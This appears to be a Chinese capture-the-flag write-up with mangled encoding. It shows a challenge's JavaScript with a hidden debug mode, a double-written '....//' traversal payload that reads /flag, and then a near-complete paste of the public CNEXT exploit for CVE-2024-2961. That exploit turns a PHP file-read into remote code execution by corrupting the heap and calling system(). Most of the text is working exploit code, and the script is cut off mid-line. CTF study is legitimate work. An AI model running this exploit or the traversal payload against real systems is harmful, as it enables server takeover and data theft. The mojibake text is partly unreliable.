Fné”®é•¿æŒ‰æ¿€æ´»è°ƒè¯•æ¨¡å¼fnKey.addEventListener(&#x27;mousedown&#x27;, function() &#123;    this.classList.add(&#x27;key-press&#x27;);    fnPressTimer = setTimeout(() =&gt; &#123;        debugMode = !debugMode;        if (debugMode) &#123;            addScreenMessage(&quot;[è°ƒè¯•æ¨¡å¼å·²æ¿€æ´»]&quot;, &quot;text-yellow-300&quot;);            debugHint.style.display = &#x27;block&#x27;;        &#125; else &#123;            addScreenMessage(&quot;[è°ƒè¯•æ¨¡å¼å·²å…³é—­]&quot;, &quot;text-red-400&quot;);            debugHint.style.display = &#x27;none&#x27;;        &#125;    &#125;, FN_HOLD_DURATION);&#125;);fnKey.addEventListener(&#x27;mouseup&#x27;, function() &#123;    this.classList.remove(&#x27;key-press&#x27;);    clearTimeout(fnPressTimer);&#125;);fnKey.addEventListener(&#x27;mouseleave&#x27;, function() &#123;    this.classList.remove(&#x27;key-press&#x27;);    clearTimeout(fnPressTimer);&#125;);// å¤§å°å†™åˆ‡æ¢åŠŸèƒ½capsKey.addEventListener(&#x27;click&#x27;, function() &#123;    this.classList.add(&#x27;key-press&#x27;);    setTimeout(() =&gt; this.classList.remove(&#x27;key-press&#x27;), 100);        isUpperCase = !isUpperCase;    if (isUpperCase) &#123;        this.classList.add(&#x27;caps-active&#x27;);        capsHint.style.display = &#x27;block&#x27;;        addScreenMessage(&quot;[å¤§å†™æ¨¡å¼]&quot;, &quot;text-red-400&quot;);    &#125; else &#123;        this.classList.remove(&#x27;caps-active&#x27;);        capsHint.style.display = &#x27;none&#x27;;        addScreenMessage(&quot;[å°å†™æ¨¡å¼]&quot;, &quot;text-green-400&quot;);    &#125;&#125;);// å­—æ¯é”®ç‚¹å‡»äº‹ä»¶ï¼ˆæ ¸å¿ƒï¼šèœå•çŠ¶æ€ä¸‹A/B/Cè§¦å‘é€‰æ‹©ï¼Œå…¶ä»–é”®æ­£å¸¸è¾“å…¥ï¼‰keys.forEach(key =&gt; &#123;    key.addEventListener(&#x27;click&#x27;, function() &#123;        this.classList.add(&#x27;key-press&#x27;);        setTimeout(() =&gt; this.classList.remove(&#x27;key-press&#x27;), 100);                const keyChar = this.textContent; // è·å–å½“å‰æŒ‰é”®çš„å­—ç¬¦ï¼ˆA/B/C/å…¶ä»–ï¼‰        // 1. èœå•æ¿€æ´»çŠ¶æ€ï¼šä¼˜å…ˆå¤„ç†A/B/Cé€‰æ‹©        if (isMenuActive) &#123;            if ([&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;].includes(keyChar)) &#123;                handleMenuSelection(keyChar); // è§¦å‘èœå•é€‰æ‹©é€»è¾‘            &#125; else &#123;                // éA/B/Cé”®æç¤ºæ— æ•ˆ                addScreenMessage(`[æ— æ•ˆé€‰æ‹©] è¯·æŒ‰A/B/C`, &quot;text-red-400&quot;);            &#125;            return; // èœå•çŠ¶æ€ä¸‹ä¸æ‰§è¡Œæ™®é€šè¾“å…¥        &#125;        // 2. æ™®é€šè¾“å…¥çŠ¶æ€ï¼šå¤„ç†æ‰€æœ‰å­—æ¯é”®è¾“å…¥        let inputChar = keyChar;        // æ ¹æ®å¤§å°å†™æ¨¡å¼è½¬æ¢å­—ç¬¦ï¼ˆ#å·ä¸è½¬æ¢ï¼‰        if (!isUpperCase &amp;&amp; keyChar !== &#x27;#&#x27;) &#123;            inputChar = inputChar.toLowerCase();        &#125;        inputBox.value += inputChar;        inputBox.focus();    &#125;);&#125;);// èœå•é”®åŠŸèƒ½ï¼ˆæ›´æ–°èœå•é€‰é¡¹ä¸ºA/B/Cï¼‰menuKey.addEventListener(&#x27;click&#x27;, function() &#123;    this.classList.add(&#x27;key-press&#x27;);    setTimeout(() =&gt; this.classList.remove(&#x27;key-press&#x27;), 100);        // åˆ‡æ¢èœå•çŠ¶æ€    if (!isMenuActive) &#123;        isMenuActive = true;        addScreenMessage(&quot;[èœå•å·²æ¿€æ´»]&quot;);        addScreenMessage(&quot;A. å¤©æ°”&quot;); // Aå¯¹åº”æŸ¥è¯        addScreenMessage(&quot;B. æ¸¸æˆ&quot;); // Bå¯¹åº”æ¸¸æˆ        addScreenMessage(&quot;C. è®¾ç½®&quot;); // Cå¯¹åº”è®¾ç½®        inputBox.value = &quot;&quot;; // æ¸…ç©ºè¾“å…¥æ¡†ï¼Œé¿å…å¹²æ‰°    &#125; else &#123;        isMenuActive = false;        addScreenMessage(&quot;[èœå•å·²å…³é—­]&quot;);        addScreenMessage(&quot;è¿”å›æ™®é€šè¾“å…¥æ¨¡å¼&quot;);    &#125;&#125;);// æ ¸å¿ƒï¼šå¤„ç†èœå•é€‰æ‹©ï¼ˆA/B/Cå¯¹åº”ä¸åŒåŠŸèƒ½å›æ˜¾ï¼‰function handleMenuSelection(key) &#123;    switch(key) &#123;        case &quot;A&quot;:            addScreenMessage(&quot;&gt; A&quot;); // å›æ˜¾é€‰æ‹©çš„æŒ‰é”®            addScreenMessage(&quot;ä»Šå¤©å¤©æ°”å¾ˆå¥½ï¼Œè®°å¾—ç»§ç»­ä¿æŒå¥½å¿ƒæƒ…å‘€ï½&quot;);            isMenuActive = false; // é€‰æ‹©åè‡ªåŠ¨é€€å‡ºèœå•ï¼Œå…è®¸è¾“å…¥å•è¯            break;        case &quot;B&quot;:            addScreenMessage(&quot;&gt; B&quot;);            addScreenMessage(&quot;ã€è‹±é›„å›è¯´ã€åŠ è½½ä¸­...&quot;);            addScreenMessage(&quot;ï¼ˆæŠ±æ­‰å‘€ï¼Œä½ æ‰‹é‡Œè¿™å°98å¹´äº§çš„æ–‡æ›²æ˜Ÿï¼Œè¿˜åœç•™åœ¨æŒ‰é”®æ•²å‡ºæ¸…è„†å£°å“çš„å¹´ä»£ï¼Œ2007å¹´çš„æ¸¸æˆï¼Œå®ƒè¿˜ä¸è®¤è¯†å‘¢ï½ï¼‰&quot;);            isMenuActive = false;            break;        case &quot;C&quot;:            addScreenMessage(&quot;&gt; C&quot;);            addScreenMessage(&quot;å½“å‰é…ç½®ï¼š&quot;);            addScreenMessage(&quot;  äº®åº¦ï¼š50% | éŸ³é‡ï¼š0%&quot;);            addScreenMessage(&quot;(è¿™å°æ–‡æ›²æ˜Ÿå®åœ¨å¤ªè€å•¦ï¼ŒæŒ‰é”®è¾¹ç¼˜éƒ½ç£¨å‡ºäº†åŒ…æµ†ï¼Œè¿åŸºç¡€è®¾ç½®åŠŸèƒ½éƒ½æ—©å·²æ­‡ä¸šï¼Œå†ä¹Ÿè°ƒä¸äº†èƒŒå…‰äº®åº¦å•¦ï½)&quot;);            isMenuActive = false;            break;        default:            addScreenMessage(`&gt; $&#123;key&#125;`);            addScreenMessage(&quot;[é”™è¯¯] è¯·æŒ‰A/B/Cé€‰æ‹©&quot;, &quot;text-red-400&quot;);    &#125;&#125;// è¿”å›é”®åŠŸèƒ½ï¼ˆèœå•çŠ¶æ€ä¸‹æŒ‰è¿”å›é”®å…³é—­èœå•ï¼‰backKey.addEventListener(&#x27;click&#x27;, function() &#123;    this.classList.add(&#x27;key-press&#x27;);    setTimeout(() =&gt; this.classList.remove(&#x27;key-press&#x27;), 100);        // èœå•çŠ¶æ€ä¸‹ä¼˜å…ˆå…³é—­èœå•    if (isMenuActive) &#123;        isMenuActive = false;        addScreenMessage(&quot;[è¿”å›] èœå•å·²å…³é—­&quot;);        inputBox.value = &quot;&quot;;        return;    &#125;        // æ™®é€šçŠ¶æ€ä¸‹åˆ é™¤æœ€åä¸€ä¸ªå­—ç¬¦    if (inputBox.value.length &gt; 0) &#123;        inputBox.value = inputBox.value.slice(0, -1);    &#125; else &#123;        addScreenMessage(&quot;[è¿”å›ä¸Šçº§]&quot;);    &#125;&#125;);// æŸ¥è¯/æ‰§è¡ŒæŒ‡ä»¤åŠŸèƒ½ï¼ˆä¿ç•™åŸæœ‰é€»è¾‘ï¼‰searchKey.addEventListener(&#x27;click&#x27;, function() &#123;    this.classList.add(&#x27;key-press&#x27;);    setTimeout(() =&gt; this.classList.remove(&#x27;key-press&#x27;), 100);        const input = inputBox.value.trim();    if (!input) &#123;        addScreenMessage(&quot;è¯·è¾“å…¥å†…å®¹&quot;);        return;    &#125;    addScreenMessage(`&gt; $&#123;input&#125;`);        // å‘é€è¯·æ±‚åˆ°åç«¯    fetch(&#x27;handler.php&#x27;, &#123;        method: &#x27;POST&#x27;,        headers: &#123;            &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,        &#125;,        body: `action=$&#123;debugMode ? &#x27;command&#x27; : &#x27;lookup&#x27;&#125;&amp;content=$&#123;encodeURIComponent(input)&#125;`    &#125;)    .then(response =&gt; response.text())    .then(data =&gt; &#123;        if (data.includes(&#x27;ERROR:&#x27;)) &#123;            addScreenMessage(data.replace(&#x27;ERROR:&#x27;, &#x27;&#x27;), &#x27;text-red-400&#x27;);        &#125; else &#123;            const displayData = data.replace(/\\n/g, &#x27;&lt;br&gt;&#x27;);            addScreenMessage(displayData);        &#125;    &#125;)    .catch(error =&gt; &#123;        addScreenMessage(`è¯·æ±‚å¤±è´¥: $&#123;error.message&#125;`, &#x27;text-red-400&#x27;);    &#125;);&#125;);// æ¸…ç©ºåŠŸèƒ½ï¼ˆæ¸…ç©ºæ—¶å…³é—­èœå•ï¼‰clearKey.addEventListener(&#x27;click&#x27;, function() &#123;    this.classList.add(&#x27;key-press&#x27;);    setTimeout(() =&gt; this.classList.remove(&#x27;key-press&#x27;), 100);    inputBox.value = &#x27;&#x27;;        // èœå•çŠ¶æ€ä¸‹æ¸…ç©ºæ—¶åŒæ­¥å…³é—­èœå•    if (isMenuActive) &#123;        isMenuActive = false;        addScreenMessage(&quot;[èœå•å·²å…³é—­] è¾“å…¥å·²æ¸…ç©º&quot;);    &#125; else &#123;        addScreenMessage(&quot;å·²æ¸…ç©ºè¾“å…¥&quot;);    &#125;&#125;);// å±å¹•æ¶ˆæ¯æ·»åŠ å‡½æ•°function addScreenMessage(message, className = &#x27;&#x27;) &#123;    const p = document.createElement(&#x27;p&#x27;);    p.innerHTML = message;    if (className) &#123;        p.className = className;    &#125;    screenContent.appendChild(p);    // è‡ªåŠ¨æ»šåŠ¨åˆ°åº•éƒ¨    screenContent.scrollTop = screenContent.scrollHeight;&#125;// é”®ç›˜è¾“å…¥å¤„ç†ï¼ˆæ”¯æŒé”®ç›˜A/B/Cé€‰æ‹©èœå•ï¼‰document.addEventListener(&#x27;keydown&#x27;, function(e) &#123;    // é˜»æ­¢é»˜è®¤è¡Œä¸ºï¼Œé¿å…é‡å¤è¾“å…¥    if (/^[a-z#]$/i.test(e.key) || e.key === &#x27;Backspace&#x27; || e.key === &#x27;Enter&#x27;) &#123;        e.preventDefault();    &#125;        const key = e.key.toUpperCase(); // ç»Ÿä¸€è½¬ä¸ºå¤§å†™å¤„ç†ï¼ˆå…¼å®¹å¤§å°å†™è¾“å…¥ï¼‰    // èœå•çŠ¶æ€ä¸‹ï¼Œä¼˜å…ˆå¤„ç†A/B/Cé”®ï¼ˆé”®ç›˜è¾“å…¥ï¼‰    if (isMenuActive &amp;&amp; [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;].includes(key)) &#123;        handleMenuSelection(key);        return;    &#125;    // æ™®é€šè¾“å…¥çŠ¶æ€å¤„ç†    if (/^[A-Z]$/.test(key)) &#123;        let inputChar = isUpperCase ? key : key.toLowerCase();        inputBox.value += inputChar;    &#125; else if (key === &#x27;#&#x27;) &#123;        inputBox.value += &#x27;#&#x27;;    &#125; else if (e.key === &#x27;Enter&#x27;) &#123;        searchKey.click();    &#125; else if (e.key === &#x27;Backspace&#x27;) &#123;        backKey.click(); // å¤ç”¨è¿”å›é”®é€»è¾‘ï¼ˆå«èœå•å…³é—­ï¼‰    &#125; else if (e.key === &#x27;Escape&#x27;) &#123;        clearKey.click(); // å¤ç”¨æ¸…ç©ºé”®é€»è¾‘ï¼ˆå«èœå•å…³é—­ï¼‰    &#125; else if (e.key === &#x27;CapsLock&#x27;) &#123;        capsKey.click(); // åŒæ­¥ç³»ç»Ÿå¤§å°å†™    &#125;&#125;);    \n\nå‘ç°å­˜åœ¨è°ƒè¯•æ¨¡å¼,é•¿æŒ‰Fnå³å¯è¿›å…¥\nå‘ç°å¯ä»¥è¾“å…¥#HELP\n\n\n\nå¾—åˆ°æç¤º\næç¤ºï¼šflagåœ¨/flagä¸‹ï¼Œå¯ä»¥å°è¯•ç›®å½•ç©¿è¶Šæ¼æ´æ¥è¯»å–å®ƒã€‚ä¼šè¿‡æ»¤â€œ../â€ï¼Œå¯ä»¥ä½¿ç”¨åŒå†™æ¥ç»•è¿‡ã€‚æ–‡ä»¶åæœ‰å¤§å°å†™åŒºåˆ†ã€‚\n\n#read ....//....//....//....//flag\n\n\nflag&#123;61c8ac25-502a-4465-8295-6466f5917180&#125;\n\nSeRce&lt;?phphighlight_file(__FILE__);$exp = $_GET[&quot;exp&quot;];if(isset($exp))&#123;    if(serialize(unserialize($exp)) != $exp)&#123;        $data = file_get_contents($_POST[&#x27;filetoread&#x27;]);        echo &quot;File Contents: $data&quot;;    &#125;&#125;\n\nä¹‹å‰æœ‰è§åˆ°è¿‡è¿™é¢˜,CVE-2024-2961\nå¯å‚è€ƒè¿™ç¯‡æ–‡ç« :https://xz.aliyun.com/news/14986,https://github.com/kezibei/php-filter-iconv\nå­˜åœ¨ä»¥ä¸‹åˆ©ç”¨è„šæœ¬:\n#!/usr/bin/env python3## CNEXT: PHP file-read to RCE (CVE-2024-2961)# Date: 2024-05-27# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)## TODO Parse LIBC to know if patched## INFORMATIONS## To use, implement the Remote class, which tells the exploit how to send the payload.#from __future__ import annotationsimport base64import zlibfrom dataclasses import dataclassfrom requests.exceptions import ConnectionError, ChunkedEncodingErrorfrom pwn import *from ten import *HEAP_SIZE = 2 * 1024 * 1024BUG = &quot;åŠ„&quot;.encode(&quot;utf-8&quot;)class Remote:    &quot;&quot;&quot;A helper class to send the payload and download files.        The logic of the exploit is always the same, but the exploit needs to know how to    download files (/proc/self/maps and libc) and how to send the payload.        The code here serves as an example that attacks a page that looks like:        ```php    &lt;?php        $data = file_get_contents($_POST[&#x27;file&#x27;]);    echo &quot;File contents: $data&quot;;\n\nTweak it to fit your target, and start the exploit.\n&quot;&quot;&quot;\n\ndef __init__(self, url: str) -&gt; None:\n    self.url = url\n    self.session = Session()\n\ndef send(self, path: str) -&gt; Response:\n    &quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.\n    &quot;&quot;&quot;\n    return self.session.post(self.url, data=&#123;&quot;file&quot;: path&#125;)\n    \ndef download(self, path: str) -&gt; bytes:\n    &quot;&quot;&quot;Returns the contents of a remote file.\n    &quot;&quot;&quot;\n    path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;\n    response = self.send(path)\n    data = response.re.search(b&quot;File contents: (.*)&quot;, flags=re.S).group(1)\n    return base64.decode(data)\n\n@entry@arg(â€œurlâ€, â€œTarget URLâ€)@arg(â€œcommandâ€, â€œCommand to run on the system; limited to 0x140 bytesâ€)@arg(â€œsleepâ€, â€œTime to sleep to assert that the exploit worked. By default, 1.â€)@arg(â€œheapâ€, â€œAddress of the main zend_mm_heap structure.â€)@arg(    â€œpadâ€,    â€œNumber of 0x100 chunks to pad with. If the website makes a lot of heap â€œ    â€œoperations with this size, increase this. Defaults to 20.â€,)@dataclassclass Exploit:    â€œâ€â€CNEXT exploit: RCE using a file read primitive in PHP.â€â€â€\nurl: str\ncommand: str\nsleep: int = 1\nheap: str = None\npad: int = 20\n\ndef __post_init__(self):\n    self.remote = Remote(self.url)\n    self.log = logger(&quot;EXPLOIT&quot;)\n    self.info = &#123;&#125;\n    self.heap = self.heap and int(self.heap, 16)\n\ndef check_vulnerable(self) -&gt; None:\n    &quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various\n    wrappers and filters that the exploit needs.\n    &quot;&quot;&quot;\n    \n    def safe_download(path: str) -&gt; bytes:\n        try:\n            return self.remote.download(path)\n        except ConnectionError:\n            failure(&quot;Target not [b]reachable[/] ?&quot;)\n\n\n    def check_token(text: str, path: str) -&gt; bool:\n        result = safe_download(path)\n        return text.encode() == result\n\n    text = tf.random.string(50).encode()\n    base64 = b64(text, misalign=True).decode()\n    path = f&quot;data:text/plain;base64,&#123;base64&#125;&quot;\n    \n    result = safe_download(path)\n    \n    if text not in result:\n        msg_failure(&quot;Remote.download did not return the test string&quot;)\n        print(&quot;--------------------&quot;)\n        print(f&quot;Expected test string: &#123;text&#125;&quot;)\n        print(f&quot;Got: &#123;result&#125;&quot;)\n        print(&quot;--------------------&quot;)\n        failure(&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;)\n\n    msg_info(&quot;The [i]data://[/] wrapper works&quot;)\n\n    text = tf.random.string(50)\n    base64 = b64(text.encode(), misalign=True).decode()\n    path = f&quot;php://filter//resource=data:text/plain;base64,&#123;base64&#125;&quot;\n    if not check_token(text, path):\n        failure(&quot;The [i]php://filter/[/] wrapper does not work&quot;)\n\n    msg_info(&quot;The [i]php://filter/[/] wrapper works&quot;)\n\n    text = tf.random.string(50)\n    base64 = b64(compress(text.encode()), misalign=True).decode()\n    path = f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,&#123;base64&#125;&quot;\n\n    if not check_token(text, path):\n        failure(&quot;The [i]zlib[/] extension is not enabled&quot;)\n\n    msg_info(&quot;The [i]zlib[/] extension is enabled&quot;)\n\n    msg_success(&quot;Exploit preconditions are satisfied&quot;)\n\ndef get_file(self, path: str) -&gt; bytes:\n    with msg_status(f&quot;Downloading [i]&#123;path&#125;[/]...&quot;):\n        return self.remote.download(path)\n\ndef get_regions(self) -&gt; list[Region]:\n    &quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;\n    maps = self.get_file(&quot;/proc/self/maps&quot;)\n    maps = maps.decode()\n    PATTERN = re.compile(\n        r&quot;^([a-f0-9]+)-([a-f0-9]+)\\b&quot; r&quot;.*&quot; r&quot;\\s([-rwx]&#123;3&#125;[ps])\\s&quot; r&quot;(.*)&quot;\n    )\n    regions = []\n    for region in table.split(maps, strip=True):\n        if match := PATTERN.match(region):\n            start = int(match.group(1), 16)\n            stop = int(match.group(2), 16)\n            permissions = match.group(3)\n            path = match.group(4)\n            if &quot;/&quot; in path or &quot;[&quot; in path:\n                path = path.rsplit(&quot; &quot;, 1)[-1]\n            else:\n                path = &quot;&quot;\n            current = Region(start, stop, permissions, path)\n            regions.append(current)\n        else:\n            print(maps)\n            failure(&quot;Unable to parse memory mappings&quot;)\n\n    self.log.info(f&quot;Got &#123;len(regions)&#125; memory regions&quot;)\n\n    return regions\n\ndef get_symbols_and_addresses(self) -&gt; None:\n    &quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;\n    regions = self.get_regions()\n\n    LIBC_FILE = &quot;/dev/shm/cnext-libc&quot;\n\n    # PHP&#39;s heap\n\n    self.info[&quot;heap&quot;] = self.heap or self.find_main_heap(regions)\n\n    # Libc\n\n    libc = self._get_region(regions, &quot;libc-&quot;, &quot;libc.so&quot;)\n\n    self.download_file(libc.path, LIBC_FILE)\n\n    self.info[&quot;libc&quot;] = ELF(LIBC_FILE, checksec=False)\n    self.info[&quot;libc&quot;].address = libc.start\n\ndef _get_region(self, regions: list[Region], *names: str) -&gt; Region:\n    &quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;\n    for region in regions:\n        if any(name in region.path for name in names):\n            break\n    else:\n        failure(&quot;Unable to locate region&quot;)\n\n    return region\n\ndef download_file(self, remote_path: str, local_path: str) -&gt; None:\n    &quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;\n    data = self.get_file(remote_path)\n    Path(local_path).write(data)\n\ndef find_main_heap(self, regions: list[Region]) -&gt; Region:\n    # Any anonymous RW region with a size superior to the base heap size is a\n    # candidate. The heap is at the bottom of the region.\n    heaps = [\n        region.stop - HEAP_SIZE + 0x40\n        for region in reversed(regions)\n        if region.permissions == &quot;rw-p&quot;\n        and region.size &gt;= HEAP_SIZE\n        and region.stop &amp; (HEAP_SIZE-1) == 0\n        and region.path in (&quot;&quot;, &quot;[anon:zend_alloc]&quot;)\n    ]\n\n    if not heaps:\n        failure(&quot;Unable to find PHP&#39;s main heap in memory&quot;)\n\n    first = heaps[0]\n\n    if len(heaps) &gt; 1:\n        heaps = &quot;, &quot;.join(map(hex, heaps))\n        msg_info(f&quot;Potential heaps: [i]&#123;heaps&#125;[/] (using first)&quot;)\n    else:\n        msg_info(f&quot;Using [i]&#123;hex(first)&#125;[/] as heap&quot;)\n\n    return first\n\ndef run(self) -&gt; None:\n    self.check_vulnerable()\n    self.get_symbols_and_addresses()\n    self.exploit()\n\ndef build_exploit_path(self) -&gt; str:\n    &quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the\n    other. Processing generally involves making some kind of operation either\n    on the chunk or in a destination chunk of the same size. Each operation is\n    applied on every single chunk; you cannot make PHP apply iconv on the first 10\n    chunks and leave the rest in place. That&#39;s where the difficulties come from.\n\n    Keep in mind that we know the address of the main heap, and the libraries.\n    ASLR/PIE do not matter here.\n\n    The idea is to use the bug to make the freelist for chunks of size 0x100 point\n    lower. For instance, we have the following free list:\n\n    ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00\n\n    By triggering the bug from chunk ..900, we get:\n\n    ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???\n\n    That&#39;s step 3.\n\n    Now, in order to control the free list, and make it point whereever we want,\n    we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,\n    we&#39;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.\n    That&#39;s step 2.\n\n    Now, if we were to perform step2 an then step3 without anything else, we&#39;d have\n    a problem: after step2 has been processed, the free list goes bottom-up, like:\n\n    0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900\n\n    We need to go the other way around. That&#39;s why we have step 1: it just allocates\n    chunks. When they get freed, they reverse the free list. Now step2 allocates in\n    reverse order, and therefore after step2, chunks are in the correct order.\n\n    Another problem comes up.\n\n    To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.\n    Since step2 creates chunks that contain pointers and pointers are generally not\n    UTF-8, we cannot afford to have that conversion happen on the chunks of step2.\n    To avoid this, we put the chunks in step2 at the very end of the chain, and\n    prefix them with `0\\n`. When dechunked (right before the iconv), they will\n    &quot;disappear&quot; from the chain, preserving them from the character set conversion\n    and saving us from an unwanted processing error that would stop the processing\n    chain.\n\n    After step3 we have a corrupted freelist with an arbitrary pointer into it. We\n    don&#39;t know the precise layout of the heap, but we know that at the top of the\n    heap resides a zend_mm_heap structure. We overwrite this structure in two ways.\n    Its free_slot[] array contains a pointer to each free list. By overwriting it,\n    we can make PHP allocate chunks whereever we want. In addition, its custom_heap\n    field contains pointers to hook functions for emalloc, efree, and erealloc\n    (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and\n    then overwrite the use_custom_heap flag to make PHP use these function pointers\n    instead. We can now do our favorite CTF technique and get a call to\n    system(&lt;chunk&gt;).\n    We make sure that the &quot;system&quot; command kills the current process to avoid other\n    system() calls with random chunk data, leading to undefined behaviour.\n\n    The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the\n    process is in a random state, we still get contiguous, in order chunks for our\n    exploit.\n\n    Therefore, the whole process described here CANNOT crash. Everything falls\n    perfectly in place, and nothing can get in the middle of our allocations.\n    &quot;&quot;&quot;\n\n    LIBC = self.info[&quot;libc&quot;]\n    ADDR_EMALLOC = LIBC.symbols[&quot;__libc_malloc&quot;]\n    ADDR_EFREE = LIBC.symbols[&quot;__libc_system&quot;]\n    ADDR_EREALLOC = LIBC.symbols[&quot;__libc_realloc&quot;]\n\n    ADDR_HEAP = self.info[&quot;heap&quot;]\n    ADDR_FREE_SLOT = ADDR_HEAP + 0x20\n    ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168\n\n    ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10\n\n    CS = 0x100\n\n    # Pad needs to stay at size 0x100 at every step\n    pad_size = CS - 0x18\n    pad = b&quot;\\x00&quot; * pad_size\n    pad = chunked_chunk(pad, len(pad) + 6)\n    pad = chunked_chunk(pad, len(pad) + 6)\n    pad = chunked_chunk(pad, len(pad) + 6)\n    pad = compressed_bucket(pad)\n\n    step1_size = 1\n    step1 = b&quot;\\x00&quot; * step1_size\n    step1 = chunked_chunk(step1)\n    step1 = chunked_chunk(step1)\n    step1 = chunked_chunk(step1, CS)\n    step1 = compressed_bucket(step1)\n\n    # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to\n    # ISO-2022-CN-EXT. We add a `0\\n` that makes the 4th and last dechunk &quot;crash&quot;\n\n    step2_size = 0x48\n    step2 = b&quot;\\x00&quot; * (step2_size + 8)\n    step2 = chunked_chunk(step2, CS)\n    step2 = chunked_chunk(step2)\n    step2 = compressed_bucket(step2)\n\n    step2_write_ptr = b&quot;0\\n&quot;.ljust(step2_size, b&quot;\\x00&quot;) + p64(ADDR_FAKE_BIN)\n    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)\n    step2_write_ptr = chunked_chunk(step2_write_ptr)\n    step2_write_ptr = compressed_bucket(step2_write_ptr)\n\n    step3_size = CS\n\n    step3 = b&quot;\\x00&quot; * step3_size\n    assert len(step3) == CS\n    step3 = chunked_chunk(step3)\n    step3 = chunked_chunk(step3)\n    step3 = chunked_chunk(step3)\n    step3 = compressed_bucket(step3)\n\n    step3_overflow = b&quot;\\x00&quot; * (step3_size - len(BUG)) + BUG\n    assert len(step3_overflow) == CS\n    step3_overflow = chunked_chunk(step3_overflow)\n    step3_overflow = chunked_chunk(step3_overflow)\n    step3_overflow = chunked_chunk(step3_overflow)\n    step3_overflow = compressed_bucket(step3_overflow)\n\n    step4_size = CS\n    step4 = b&quot;=00&quot; + b&quot;\\x00&quot; * (step4_size - 1)\n    step4 = chunked_chunk(step4)\n    step4 = chunked_chunk(step4)\n    step4 = chunked_chunk(step4)\n    step4 = compressed_bucket(step4)\n\n    # This chunk will eventually overwrite mm_heap-&gt;free_slot\n    # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values\n    step4_pwn = ptr_bucket(\n        0x200000,\n        0,\n        # free_slot\n        0,\n        0,\n        ADDR_CUSTOM_HEAP,  # 0x18\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        ADDR_HEAP,  # 0x140\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        0,\n        size=CS,\n    )\n\n    step4_custom_heap = ptr_bucket(\n        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18\n    )\n\n    step4_use_custom_heap_size = 0x140\n\n    COMMAND = self.command\n    COMMAND = f&quot;kill -9 $PPID; &#123;COMMAND&#125;&quot;\n    if self.sleep:\n        COMMAND = f&quot;sleep &#123;self.sleep&#125;; &#123;COMMAND&#125;&quot;\n    COMMAND = COMMAND.encode() + b&quot;\\x00&quot;\n\n    assert (\n        len(COMMAND) &lt;= step4_use_custom_heap_size\n    ), f&quot;Command too big (&#123;len(COMMAND)&#125;), it must be strictly inferior to &#123;hex(step4_use_custom_heap_size)&#125;&quot;\n    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&quot;\\x00&quot;)\n\n    step4_use_custom_heap = COMMAND\n    step4_use_custom_heap = qpe(step4_use_custom_heap)\n    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)\n    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)\n    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)\n    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)\n\n    pages = (\n        step4 * 3\n        + step4_pwn\n        + step4_custom_heap\n        + step4_use_custom_heap\n        + step3_overflow\n        + pad * self.pad\n        + step1 * 3\n        + step2_write_ptr\n        + step2 * 2\n    )\n\n    resource = compress(compress(pages))\n    resource = b64(resource)\n    resource = f&quot;data:text/plain;base64,&#123;resource.decode()&#125;&quot;\n\n    filters = [\n        # Create buckets\n        &quot;zlib.inflate&quot;,\n        &quot;zlib.inflate&quot;,\n        \n        # Step 0: Setup heap\n        &quot;dechunk&quot;,\n        &quot;convert.iconv.L1.L1&quot;,\n        \n        # Step 1: Reverse FL order\n        &quot;dechunk&quot;,\n        &quot;convert.iconv.L1.L1&quot;,\n        \n        # Step 2: Put fake pointer and make FL order back to normal\n        &quot;dechunk&quot;,\n        &quot;convert.iconv.L1.L1&quot;,\n        \n        # Step 3: Trigger overflow\n        &quot;dechunk&quot;,\n        &quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;,\n        \n        # Step 4: Allocate at arbitrary address and change zend_mm_heap\n        &quot;convert.quoted-printable-decode&quot;,\n        &quot;convert.iconv.L1.L1&quot;,\n    ]\n    filters = &quot;|&quot;.join(filters)\n    path = f&quot;php://filter/read=&#123;filters&#125;/resource=&#123;resource&#125;&quot;\n\n    return path\n\n@inform(&quot;Triggering...&quot;)\ndef exploit(self) -&gt; None:\n    path = self.build_exploit_path()\n    start = time.time()\n\n    try:\n        self.remote.send(path)\n    except (ConnectionError, ChunkedEncodingError):\n        pass\n    \n    msg_print()\n    \n    if not self.sleep:\n        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;)\n    elif start + self.sleep 